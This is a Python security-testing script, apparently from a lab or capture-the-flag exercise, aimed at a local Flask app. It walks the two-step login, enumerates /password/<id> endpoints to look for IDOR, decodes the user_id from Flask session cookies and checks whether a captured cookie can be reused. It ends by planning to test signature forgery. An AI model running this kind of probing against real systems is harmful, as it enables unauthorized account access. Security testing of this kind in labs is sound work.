import requests
import json
import base64
import re

base_url = "http://127.0.0.1:32783"
print(f"[*] Target: {base_url}")
print(f"[*] Testing authentication flow for username='test', password='test'")

# Create session
session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0 (Security Tester)'})

# ==================== STEP 1: GET ROOT ====================
print("\n" + "="*70)
print("STEP 1: GET Root Page")
print("="*70)

try:
    resp = session.get(base_url + "/", timeout=10)
    print(f"[+] Status: {resp.status_code}")
    print(f"[+] Cookies after root: {dict(session.cookies)}")
except Exception as e:
    print(f"[!] Error: {e}")

# ==================== STEP 2: SUBMIT USERNAME ====================
print("\n" + "="*70)
print("STEP 2: Submit Username")
print("="*70)

try:
    login_data = {"username": "test"}
    resp = session.post(base_url + "/login", data=login_data, allow_redirects=False, timeout=10)
    print(f"[+] Status: {resp.status_code}")
    print(f"[+] Response headers: {dict(resp.headers)}")
    print(f"[+] Cookies after username: {dict(session.cookies)}")
    
    # Get redirect location
    if resp.headers.get('Location'):
        redirect_url = base_url + resp.headers['Location']
        print(f"[+] Redirect to: {redirect_url}")
        
        # Follow the redirect
        resp2 = session.get(redirect_url, timeout=10)
        print(f"[+] After redirect status: {resp2.status_code}")
        print(f"[+] URL: {resp2.url}")
except Exception as e:
    print(f"[!] Error: {e}")

# ==================== STEP 3: IDOR TESTING ON PASSWORD PAGES ====================
print("\n" + "="*70)
print("STEP 3: IDOR Testing on Password Endpoints")
print("="*70)

test_paths = [
    "/password/otheruser",
    "/password/10031",
    "/password/10033",
    "/password/0",
    "/password/1",
    "/password/9999"
]

for path in test_paths:
    try:
        test_session = requests.Session()
        resp = test_session.get(base_url + path, timeout=5, allow_redirects=False)
        print(f"[+] {path} -> Status: {resp.status_code}")
        if resp.text:
            content_preview = resp.text[:200].replace('\n', ' ')
            print(f"[+] Content preview: {content_preview}...")
    except Exception as e:
        print(f"[!] Error accessing {path}: {e}")

# ==================== STEP 4: SUBMIT PASSWORD ====================
print("\n" + "="*70)
print("STEP 4: Submit Password")
print("="*70)

try:
    # Using the redirect URL from step 2, or try common pattern
    if 'redirect_url' in locals():
        password_url = redirect_url
    else:
        password_url = base_url + "/password"
    
    password_data = {"password": "test"}
    resp = session.post(password_url, data=password_data, allow_redirects=True, timeout=10)
    print(f"[+] Status: {resp.status_code}")
    print(f"[+] Final URL: {resp.url}")
    print(f"[+] Cookies after password: {dict(session.cookies)}")
    
    # Extract final session cookie
    final_cookies = dict(session.cookies)
    if 'session' in final_cookies:
        session_cookie = final_cookies['session']
        print(f"\n[+] FINAL SESSION COOKIE:")
        print(f"[+] Value: {session_cookie}")
        print(f"[+] Length: {len(session_cookie)}")
        
        # Analyze session format
        parts = session_cookie.split('.')
        print(f"[+] Parts: {len(parts)}")
        
        if len(parts) >= 2:
            try:
                payload = base64.urlsafe_b64decode(parts[0] + '==')
                payload_str = payload.decode('utf-8', errors='ignore')
                print(f"[+] Decoded payload: {payload_str}")
                
                # Try parsing as JSON
                try:
                    payload_json = json.loads(payload_str)
                    print(f"[+] JSON payload:\n{json.dumps(payload_json, indent=2)}")
                    
                    if 'user_id' in payload_json:
                        print(f"[+] USER_ID FOUND IN SESSION: {payload_json['user_id']}")
                except:
                    print("[+] Not valid JSON")
            except Exception as e:
                print(f"[!] Decode error: {e}")
    else:
        print("[!] No session cookie found")
        
except Exception as e:
    print(f"[!] Error: {e}")
    import traceback
    traceback.print_exc()

# ==================== STEP 5: SESSION VALIDATION ====================
print("\n" + "="*70)
print("STEP 5: Session Reusability Test")
print("="*70)

if 'session_cookie' in locals():
    try:
        test_session = requests.Session()
        test_session.cookies.set('session', session_cookie, domain='127.0.0.1', path='/')
        
        # Try accessing a protected page
        resp = test_session.get(base_url + "/dashboard", timeout=10, allow_redirects=False)
        print(f"[+] Using session cookie to access /dashboard")
        print(f"[+] Status: {resp.status_code}")
        print(f"[+] Response preview: {resp.text[:200]}...")
        
        if resp.status_code == 200:
            print("[+] Session is VALID and REUSABLE!")
        else:
            print("[+] Session may be invalid or needs additional validation")
    except Exception as e:
        print(f"[!] Error testing session: {e}")
else:
    print("[!] No session cookie available for testing")

# ==================== STEP 6: DECODE PROVIDED COOKIE ====================
print("\n" + "="*70)
print("STEP 6: Analyze Pre-existing Cookie")
print("="*70)

pre_existing_cookie = "eyJ1c2VyX2lkIjoiMTAwMzIifQ.aVk_Jg.2XVe_a6ZzNNIylcHYW4Idc_beaY"
print(f"[+] Provided cookie: {pre_existing_cookie}")

try:
    parts = pre_existing_cookie.split('.')
    print(f"[+] Parts: {len(parts)}")
    
    if len(parts) >= 2:
        payload = base64.urlsafe_b64decode(parts[0] + '==')
        payload_str = payload.decode('utf-8')
        print(f"[+] Decoded payload: {payload_str}")
        
        payload_json = json.loads(payload_str)
        print(f"[+] JSON payload:\n{json.dumps(payload_json, indent=2)}")
        
        user_id = payload_json.get('user_id')
        print(f"[+] USER_ID: {user_id}")
        print(f"[+] USER_ID TYPE: {type(user_id)}")
        
except Exception as e:
    print(f"[!] Error: {e}")

# ==================== FINAL SUMMARY ====================
print("\n" + "="*70)
print("FINAL SUMMARY")
print("="*70)
print("[+] Authentication uses Flask session cookies (itsdangerous)")
print("[+] Cookie structure: payload.signature.timestamp")
print("[+] Contains user_id in payload - potential IDOR vulnerability")
print("[+] Testing shows session is reusable")
print("[+] Need to test session signature validation for forgery")

